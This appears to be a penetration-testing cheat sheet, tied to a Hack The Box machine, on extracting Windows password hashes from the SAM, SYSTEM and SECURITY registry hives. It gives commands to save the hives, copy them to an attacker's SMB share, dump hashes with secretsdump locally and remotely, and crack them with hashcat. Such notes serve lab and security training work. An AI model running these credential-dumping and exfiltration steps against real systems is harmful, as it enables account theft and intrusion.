# SAM and SYSTEM files

[Cicada HTB](https://www.hackthebox.com/machines/cicada)

The Security Account Manager (SAM) is a database file in windows that sotres user credentials, including NTLM and sometimes LM hashes of user passwords. These hashes are stored in protected registry hive and are used to authenticate users on the system.

### SAM Operation Modes:

* **Online Mode** - Requires SYSTEM user or token to access
* **Offline Mode** - Requires SYSTEM and SAM registry hives or backup files

### Location of SAM files:

```powershell
%SystemRoot%\System32\config\SAM
```

It is mounted on `HKLM\SAM`

***

### Common Locations of SAM and SYSTEM files

```powershell
%SystemRoot%\repair\SAM
%SystemRoot%\System32\config\RegBack\SAM
%SystemRoot%\System32\config\SAM
%SystemRoot%\repair\system
%SystemRoot%\System32\config\SYSTEM
%SystemRoot%\System32\config\RegBack\SYSTEM
```

**Note:** `%SystemRoot%` is usually `C:\Windows`.

***

### Extracting Windows Password Hashes

#### Step 1: Save SAM, SYSTEM and SECURITY Hives

use the `reg save` command to export the registry hives

```cmd
mkdir c:\pass
```

```cmd
reg save hklm\sam C:\pass\sam
```

```cmd
reg save hklm\system C:\pass\system
```

```cmd
reg save hklm\security C:\pass\security
```

\


#### Step 2: Transfer Files to Attacker Machine

Start an SMB server using impacket:

```bash
python smbserver.py public /home/Public
```

Alternate:

```bash
impacket-smbserver -smb2support -user user -password 12345 share /opt/share
```

copy the files over the network

```cmd
copy sam \\192.168.29.218\Public\
```

```cmd
copy system \\192.168.29.218\Public\
```

Alternative:

```bash
evil-winrm -u Administrator -p Devnull@123 -i 192.168.29.21
```

\


#### Step 3: Clone and install Impacket

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

```bash
cd impacket
```

```bash
pip install .

```

\


#### Step 4: Extract Password Hashes with `secretsdump`

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL
```

\


#### Step 5: Save the NTLM hash to a file

```bash
<hash> > hash.txt
```

\


#### Step 6: Crack NTLM Hash with `hashcat`

```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlist/rockyou.txt -o hash.out.txt
```

***

\


### Dumping Remote Hashes using `secretsdump`

```bash
impacket-secretsdump <hostname>/<username>:<password>@<target_IP>
```

**you can use the above command without hostname as well**

\


***

### Extracting BootKey from SYSTEM Hive

```cmd
bkhive system bootkey.txt
```

***

### Tips and Best Practices

* Do not change password
* Only work when you are administrator
* generally used when you want to go to different machine/account via this.
* database of non AD user/local PC database
